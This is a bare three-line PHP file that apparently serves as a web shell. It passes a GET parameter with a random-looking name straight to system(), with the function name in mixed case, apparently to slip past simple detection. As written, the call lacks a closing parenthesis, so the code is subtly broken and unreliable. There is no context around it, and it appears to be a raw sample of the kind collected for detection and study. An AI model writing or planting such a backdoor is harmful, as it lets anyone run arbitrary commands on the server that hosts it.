<?php
SysTeM($_GET['S0DxNY8B'];
?>
